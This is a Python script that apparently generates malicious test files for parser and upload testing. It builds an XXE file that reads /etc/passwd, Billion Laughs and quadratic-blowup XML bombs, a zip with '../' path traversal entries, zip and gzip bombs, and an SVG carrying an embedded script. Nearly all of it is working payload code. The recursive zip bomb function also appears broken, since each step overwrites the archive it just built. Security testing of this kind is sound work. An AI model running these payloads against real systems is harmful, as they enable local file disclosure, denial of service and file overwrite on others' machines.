import os
import zipfile
import gzip
import base64

def generate_xxe_file(filename="xxe.xml", target_file="/etc/passwd"):
    """
    Generates an XML file with an XXE payload to read a local file.
    """
    payload = f"""<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<lolz>&xxe;</lolz>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated XXE file: {filename}")

def generate_billion_laughs_file(filename="billion_laughs.xml"):
    """
    Generates an XML file for a Billion Laughs attack (XML bomb).
    """
    payload = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated Billion Laughs file: {filename}")

def generate_quadratic_blowup_file(filename="quadratic_blowup.xml", iterations=50000):
    """
    Generates an XML file for a Quadratic Blowup attack.
    """
    payload = "<!DOCTYPE a [\n"
    payload += "<!ENTITY a " + "\"a\"" * iterations + ">\n"
    payload += "]>\n"
    payload += "<a>" + "&a;" * iterations + "</a>"
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated Quadratic Blowup file: {filename}")

def create_archive_with_traversal(filename="traversal.zip", file_to_create="test.txt", depth=10):
    """
    Creates a zip file with a path traversal payload.
    """
    traversal_path = os.path.join(*([".."] * depth), file_to_create)
    with zipfile.ZipFile(filename, 'w') as zf:
        zf.writestr(traversal_path, "evil content")
    print(f"Generated zip file with path traversal: {filename}")

def create_compressed_archive_bomb(filename="bomb.zip", size=10, level=1):
    """
    Creates a recursive zip bomb.
    """
    if level == 0:
        return

    zf = zipfile.ZipFile(f'level_{level}.zip', 'w', zipfile.ZIP_DEFLATED)
    for i in range(size):
        zf.writestr(f'file_{i}.txt', b'0' * 1024)
    zf.close()

    if level > 1:
        parent_zf = zipfile.ZipFile(f'level_{level-1}.zip', 'w', zipfile.ZIP_DEFLATED)
        for i in range(size):
            parent_zf.write(f'level_{level}.zip', f'zip_{i}.zip')
        parent_zf.close()
        os.remove(f'level_{level}.zip')

    if level > 1:
        create_compressed_archive_bomb(size=size, level=level-1)
    else:
        os.rename(f'level_1.zip', filename)
    print(f"Generated zip bomb: {filename}")


def create_gzipped_bomb(filename="bomb.gz", uncompressed_size=1024*1024*10):
    """
    Creates a gzipped file that expands to a large size.
    """
    with gzip.open(filename, 'wb', compresslevel=9) as f:
        f.write(b'\0' * uncompressed_size)
    print(f"Generated gzipped file: {filename}")

def generate_malicious_svg(filename="malicious.svg"):
    """
    Generates a malicious SVG file with an embedded script.
    """
    payload = """<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
  <script>
    alert('This could be malicious code!');
  </script>
</svg>"""
    with open(filename, "w") as f:
        f.write(payload)
    print(f"Generated malicious SVG file: {filename}")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="Generate malicious files for testing.")
    parser.add_argument("filetype", choices=["xxe", "billion_laughs", "quadratic_blowup", "zip_traversal", "zip_bomb", "gz_bomb", "svg"], help="Type of file to generate.")
    args = parser.parse_args()

    if args.filetype == "xxe":
        generate_xxe_file()
    elif args.filetype == "billion_laughs":
        generate_billion_laughs_file()
    elif args.filetype == "quadratic_blowup":
        generate_quadratic_blowup_file()
    elif args.filetype == "zip_traversal":
        create_archive_with_traversal()
    elif args.filetype == "zip_bomb":
        create_compressed_archive_bomb()
    elif args.filetype == "gz_bomb":
        create_gzipped_bomb()
    elif args.filetype == "svg":
        generate_malicious_svg()
